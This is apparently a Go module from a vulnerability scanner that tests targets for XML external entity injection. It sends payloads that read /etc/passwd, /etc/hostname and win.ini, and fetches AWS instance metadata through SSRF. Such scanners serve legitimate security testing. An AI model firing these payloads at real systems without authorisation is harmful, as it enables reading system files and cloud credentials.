package xxe

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"vulnscan-backend/scan/engine"
)

type XXEScanner struct {
	base *engine.VulnScanner
}

func New() *XXEScanner {
	return &XXEScanner{}
}

func (m *XXEScanner) ID() string       { return "xxe" }
func (m *XXEScanner) Name() string     { return "XXE 外部实体注入" }
func (m *XXEScanner) Category() string { return "vuln" }

func (m *XXEScanner) Params() []engine.ModuleParam {
	return []engine.ModuleParam{engine.VulnVerificationParam()}
}

func (m *XXEScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
	m.base = engine.NewVulnScanner(config)
	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

var hostnamePattern = regexp.MustCompile(`^[a-zA-Z0-9._-]+$`)

var xmlParserErrors = []*regexp.Regexp{
	regexp.MustCompile(`(?i)XML\s+Parsing\s+Error`),
	regexp.MustCompile(`(?i)SAXParseException`),
	regexp.MustCompile(`(?i)simplexml_load_string`),
	regexp.MustCompile(`(?i)DOMDocument::loadXML`),
	regexp.MustCompile(`(?i)JAXP.*error`),
	regexp.MustCompile(`(?i)lxml\.etree`),
	regexp.MustCompile(`(?i)xml\.parsers\.expat`),
	regexp.MustCompile(`(?i)XMLSyntaxError`),
	regexp.MustCompile(`(?i)Start tag expected`),
	regexp.MustCompile(`(?i)EntityRef`),
}

func (m *XXEScanner) testTarget(ctx context.Context, target *engine.Target, verifyLevel string) []*engine.Finding {
	var findings []*engine.Finding

	if engine.ShouldRunPrinciple(verifyLevel) {
		if f := m.testXMLAcceptance(ctx, target); f != nil {
			findings = append(findings, f)
		}
		if f := m.testEntityEcho(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	if engine.ShouldRunExploit(verifyLevel) {
		if f := m.testFileRead(ctx, target); f != nil {
			findings = append(findings, f)
		}
		if f := m.testSSRFViaXXE(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	return findings
}

func (m *XXEScanner) testXMLAcceptance(ctx context.Context, target *engine.Target) *engine.Finding {
	malformedXML := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxetest "xxe_test_value">]><root>&xxetest;</root>`

	body := m.base.SendXML(ctx, target.URL, malformedXML)
	if body == "" {
		return nil
	}

	for _, pattern := range xmlParserErrors {
		if pattern.MatchString(body) {
			return &engine.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_error",
				Title:              "XXE XML解析器错误泄露",
				Description:        "目标接受XML输入并泄露解析器错误信息",
				Severity:           "medium",
				Confidence:         65,
				Evidence:           engine.Truncate(body, 500),
				VerificationLevel:  engine.VerifyPrinciple,
				VerificationDetail: "xml-parser-error-detected",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":  target.URL,
					"type": "xxe-error",
				},
			}
		}
	}

	return nil
}

func (m *XXEScanner) testEntityEcho(ctx context.Context, target *engine.Target) *engine.Finding {
	payload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxecanary "xxe_49_test">]><root><data>&xxecanary;</data></root>`

	body := m.base.SendXML(ctx, target.URL, payload)
	if body == "" {
		return nil
	}

	if strings.Contains(body, "xxe_49_test") {
		return &engine.Finding{
			ModuleID:           m.ID(),
			Target:             target,
			Type:               "xxe_entity",
			Title:              "XXE 内部实体解析",
			Description:        "目标解析并回显了XML内部实体定义，表明XML解析器处理DTD",
			Severity:           "high",
			Confidence:         75,
			Evidence:           engine.Truncate(body, 500),
			VerificationLevel:  engine.VerifyPrinciple,
			VerificationDetail: "internal-entity-resolved",
			Timestamp:          time.Now(),
			Data: map[string]string{
				"url":  target.URL,
				"type": "xxe-entity-echo",
			},
		}
	}

	return nil
}

func (m *XXEScanner) testFileRead(ctx context.Context, target *engine.Target) *engine.Finding {
	filePayloads := []struct {
		payload  string
		evidence string
		file     string
	}{
		{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
			"root:x:0:0",
			"/etc/passwd",
		},
		{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>`,
			"",
			"/etc/hostname",
		},
		{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>`,
			"[fonts]",
			"c:/windows/win.ini",
		},
	}

	for _, fp := range filePayloads {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		body := m.base.SendXML(ctx, target.URL, fp.payload)
		if body == "" {
			continue
		}

		detected := false
		if fp.evidence != "" && strings.Contains(body, fp.evidence) {
			detected = true
		}
		if fp.file == "/etc/hostname" && len(body) > 0 && !strings.Contains(body, "<?xml") && !strings.Contains(body, "<html") {
			if hostnamePattern.MatchString(strings.TrimSpace(body)) {
				detected = true
			}
		}

		if detected {
			return &engine.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_file_read",
				Title:              fmt.Sprintf("XXE 文件读取 - %s", fp.file),
				Description:        fmt.Sprintf("通过XXE成功读取服务器文件 %s", fp.file),
				Severity:           "critical",
				Confidence:         92,
				Evidence:           engine.Truncate(body, 500),
				VerificationLevel:  engine.VerifyExploit,
				VerificationDetail: "file-content-confirmed",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":  target.URL,
					"file": fp.file,
					"type": "xxe-file-read",
				},
			}
		}
	}

	return nil
}

func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *engine.Target) *engine.Finding {
	metadataPayloads := []struct {
		payload  string
		evidence string
		target   string
	}{
		{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
			"ami-id",
			"AWS Metadata",
		},
		{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
			"instance-id",
			"AWS Metadata",
		},
	}

	for _, mp := range metadataPayloads {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		body := m.base.SendXML(ctx, target.URL, mp.payload)
		if body == "" {
			continue
		}

		if strings.Contains(body, mp.evidence) {
			return &engine.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_ssrf",
				Title:              fmt.Sprintf("XXE SSRF - %s", mp.target),
				Description:        fmt.Sprintf("通过XXE实体访问内部服务 %s 成功", mp.target),
				Severity:           "critical",
				Confidence:         93,
				Evidence:           engine.Truncate(body, 500),
				VerificationLevel:  engine.VerifyExploit,
				VerificationDetail: "internal-service-accessed",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":    target.URL,
					"target": mp.target,
					"type":   "xxe-ssrf",
				},
			}
		}
	}

	return nil
}
